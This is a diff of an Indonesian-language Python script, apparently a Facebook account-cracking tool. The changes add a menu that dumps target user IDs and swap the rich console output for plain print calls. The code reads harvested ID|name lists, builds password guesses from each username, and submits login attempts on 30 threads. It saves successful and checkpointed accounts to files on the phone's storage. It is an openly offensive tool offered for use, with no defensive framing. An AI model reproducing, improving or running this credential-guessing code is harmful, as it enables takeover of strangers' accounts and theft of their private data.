@@ -1,16 +1,24 @@
 # coding utf-8
 # author: Zoraa Dev
 
-import os, re, sys, json, requests, time, uuid, random
-from rich.console import Console
+import os
+import re
+import sys
+import  json
+import requests
+import time
+import uuid
+import random
 from concurrent.futures import ThreadPoolExecutor
+from Dump import facebook
+
 
 class Logo:
     def __init__(self) -> None:
         pass
         
-    def ZFB_ID(self):
-        Console().print('''\r
+    def Zoraa_FB(self):
+        print('''\r
 ╔═╗┌─┐┬─┐┌─┐┌─┐╔═╗╔╗    ╦╔╦╗
 ╔═╝│ │├┬┘├─┤├─┤╠╣ ╠╩╗───║ ║║
 ╚═╝└─┘┴└─┴ ┴┴ ┴╚  ╚═╝   ╩═╩╝
@@ -38,11 +46,24 @@ class Zoraa_Dev:
         self.cp = '/sdcard/CP/CP-facebook-{}-{}-{}'.format(tanggal,bulan,tahun)
         return(self.ok,self.cp)
         
+    def Menu(self):
+        try:
+            Logo().Zoraa_FB()
+            print('[01] Crack File Yang Sudah Di Dump\n[02] Dump File Terlebih Dahulu\n')
+            query = input('[?] Input: '); print()
+            if len(query) > 0:
+                if query in '01' or query in '1': self.Via_File()
+                if query in '02' or query in '2': facebook()
+                else: exit('[!] Menu Not Found')
+            else:
+                exit('[!] Input Kosong')
+        except (KeyboardInterrupt, Exception) as e:
+            exit(f'[!] Error: {str(e).title()}')
+            
     def Via_File(self):
         try:
-            Logo().ZFB_ID()
-            Console().print('[•] Setiap File Gunakan Pemisah Koma, No Spasi!')
-            query = Console().input('[?] Input file: '); print()
+            print('[!] Setiap File Gunakan Pemisah Koma, No Spasi!')
+            query = input('[?] Input File: '); print()
             if len(query) > 0:
                 for par in query.split(','):
                     for buk in open(str(par)):
@@ -50,24 +71,24 @@ class Zoraa_Dev:
                             self.userid, self.username = buk.split('|')[0], buk.split('|')[1]
                             if self.userid+'|'+self.username not in dump:
                                 dump.append(self.userid+'|'+self.username)
-                                Console().print(f'[•] Dump: {str(self.userid)[:20]}/ {len(dump)}', end='\r')
+                                print(f'[!] Dump: {str(self.userid)[:20]}/ {len(dump)}', end='\r')
                         except (KeyboardInterrupt, Exception) as e:
-                            Console().print(f'[!] Error: {str(e).title()}')
+                            print(f'[!] Error: {str(e).title()}')
                     self.ThreadPoolExecutor()
             else:
-                exit('[!] anda tidak memasukan apapun')
+                exit('[!] Input Kosong')
         except (KeyboardInterrupt, Exception) as e:
             exit(f'[!] Error: {str(e).title()}')
 
     def ThreadPoolExecutor(self):
         try:
-            Console().print('\n\n[•] Save Ok: {}\n[•] Save Cp: {}\n'.format(self.ok,self.cp))
+            print('\n\n[•] Save Ok: {}\n[•] Save Cp: {}\n'.format(self.ok,self.cp))
             with ThreadPoolExecutor(max_workers=30) as V:
                 for UserID_And_Username in dump:
                     self.userid, self.username = UserID_And_Username.split('|')
                     self.password = self.WordList(self.username)
                     V.submit(self.Exec_WbLock, self.userid, self.password)
-            Console().print('\n\n[•] Hasil Ok: {}\n[•] Hasil Cp: {}\n\n[•] Dump ID: {}'.format(self.success,self.checkpoint,str(len(dump))))
+            print('\n\n[•] Hasil Ok: {}\n[•] Hasil Cp: {}\n\n[•] Dump ID: {}'.format(self.success,self.checkpoint,str(len(dump))))
         except (KeyboardInterrupt, Exception) as e:
             exit(f'[!] Error: {str(e).title()}')
             
@@ -219,7 +240,7 @@ class Zoraa_Dev:
                     time.sleep(31)
                     self.Exec_WbLock(userid, password)
             self.loop +=1  
-            Console().print(f" • {str(userid)[:15]} {'{:.0%}'.format(self.loop/float(len(dump)))}|{str(len(dump))}|{self.loop} Ok: {self.success}|Cp: {self.checkpoint}", end='\r')
+            print(f" • {str(userid)[:15]} {'{:.0%}'.format(self.loop/float(len(dump)))}|{str(len(dump))}|{self.loop} Ok: {self.success}|Cp: {self.checkpoint}", end='\r')
         
     def WordList(self, username):
         self.password = []
@@ -241,6 +262,6 @@ class Zoraa_Dev:
 
 if __name__ == '__main__':
     os.system('clear')
-    try: os.mkdir('/sdcard/OK') or os.mkdir('/sdcard/CP')
+    try: os.mkdir('/sdcard/OK') or os.mkdir('/sdcard/CP') or os.mkdir('/sdcard/dump')
     except (Exception) as e: pass
-    Zoraa_Dev().Via_File()
+    Zoraa_Dev().Menu()
